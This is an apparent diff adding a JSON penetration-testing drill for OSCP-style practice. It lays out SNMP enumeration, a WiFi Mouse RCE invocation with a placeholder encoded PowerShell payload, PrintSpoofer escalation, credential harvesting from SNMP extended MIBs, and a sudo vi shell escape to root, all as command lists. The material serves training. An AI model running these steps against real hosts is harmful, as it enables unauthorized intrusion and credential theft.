@@ -1,0 +1,187 @@
+{
+  "id": "snmp-forgotten-protocol",
+  "title": "SNMP: Forgotten Protocol",
+  "category": "service-drill",
+  "source": ["OSCP A/B/C", "HTB Monitored"],
+  "designed_by": "ai-composite",
+  "description": "SNMP enumeration drill: SNMP walk → service discovery (WiFi Mouse) → exploit on SNMP-WIN. SNMP extended MIB → credential leak → Nagios XI → sudo on SNMP-LIN.",
+  "introduction": "This scenario teaches SNMP as an often-overlooked attack surface. Default community strings and extended MIBs frequently leak credentials.",
+  "mental_model": "SNMP is forgotten but dangerous: walk all OIDs, check extended MIBs for scripts that output creds. Process names reveal internal services.",
+  "key_principles": [
+    "snmpwalk with public/private on UDP 161",
+    "1.3.6.1.2.1.25.4.2.1.2 lists running processes",
+    "NET-SNMP-EXTEND-MIB leaks script output and creds",
+    "Service names from SNMP guide exploit selection",
+    "sudo vi allows :!bash escape to root"
+  ],
+
+  "indicators": {
+    "difficulty": 4,
+    "cognitive_load": 3,
+    "enumeration_depth": 7,
+    "rabbit_hole_risk": 2,
+    "time_pressure": 3
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1046", "name": "Network Service Discovery"},
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "snmp", "snmpwalk", "onetwentyone", "nmap", "net-snmp-extend",
+    "wifi-mouse", "nagios-xi", "sudo", "linpeas"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "medium",
+    "recommended_order": 5
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "snmp-win",
+      "label": "SNMP-WIN",
+      "ip": "192.168.10.145",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 161,
+          "name": "SNMP",
+          "version": "UDP",
+          "vulnerabilities": [
+            {"type": "info-disclosure", "summary": "SNMP walk reveals service names (WiFi Mouse)", "leads_to": "service-discovery"}
+          ],
+          "commands": [
+            "nmap -sU -p 161 192.168.10.145",
+            {"cmd": "snmpwalk -v2c -c public 192.168.10.145", "rationale": "Why: Discover processes and services via SNMP"},
+            "snmpwalk -v2c -c public 192.168.10.145 1.3.6.1.2.1.25.4.2.1.2",
+            "onetwentyone 192.168.10.145"
+          ]
+        },
+        {
+          "port": 1978,
+          "name": "WiFi Mouse",
+          "version": "internal",
+          "vulnerabilities": [
+            {"type": "rce", "summary": "WiFi Mouse RCE (no auth)", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "searchsploit wifi mouse",
+            {"cmd": "python3 wifi_mouse_rce.py 192.168.10.145 1978 'powershell -e <base64>'", "rationale": "Why: WiFi Mouse RCE runs payload as user"}
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "svc_snmp",
+          "to": "SYSTEM",
+          "technique": "SeImpersonate → PrintSpoofer",
+          "commands": [
+            "whoami /priv",
+            "PrintSpoofer64.exe -i -c cmd"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "snmp-lin",
+      "label": "SNMP-LIN",
+      "ip": "10.10.11.248",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 161,
+          "name": "SNMP",
+          "version": "UDP",
+          "vulnerabilities": [
+            {"type": "info-disclosure", "summary": "SNMP extended MIB → credential leak", "leads_to": "nagios-creds"}
+          ],
+          "commands": [
+            "snmpwalk -v2c -c public 10.10.11.248",
+            {"cmd": "snmpwalk -v2c -c public 10.10.11.248 NET-SNMP-EXTEND-MIB::nsExtendObjects", "rationale": "Why: Extended MIBs leak credentials and config"},
+            {"cmd": "snmpwalk -v2c -c public 10.10.11.248 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line", "rationale": "Why: Output lines often contain plaintext passwords"}
+          ]
+        },
+        {
+          "port": 443,
+          "name": "Nagios XI",
+          "version": "5.x",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Nagios XI with creds from SNMP extended MIB", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "curl -k https://10.10.11.248/nagiosxi/ -u 'nagiosadmin:<from-snmp>'",
+            "searchsploit nagios xi"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "nagios",
+          "to": "root",
+          "technique": "sudo misconfiguration",
+          "commands": [
+            "sudo -l",
+            {"cmd": "sudo /usr/bin/vi /etc/nagios/commands.cfg", "rationale": "Why: sudo vi allows shell escape to root"},
+            ":!bash"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "nagiosadmin", "type": "password", "source": "SNMP extended MIB output", "unlocks": ["nagios-xi"]}
+      ],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-snmp-win",
+      "name": "SNMP-WIN: Walk → WiFi Mouse → PrintSpoofer",
+      "color": "#6bb8cc",
+      "steps": ["snmp-win"],
+      "description": "SNMP walk → service discovery (WiFi Mouse) → exploit → SeImpersonate → PrintSpoofer"
+    },
+    {
+      "id": "path-snmp-lin",
+      "name": "SNMP-LIN: Extended MIB → Nagios → sudo",
+      "color": "#e8a87c",
+      "steps": ["snmp-lin"],
+      "description": "SNMP extended MIB → credential leak → Nagios XI → sudo vi → root"
+    }
+  ]
+}
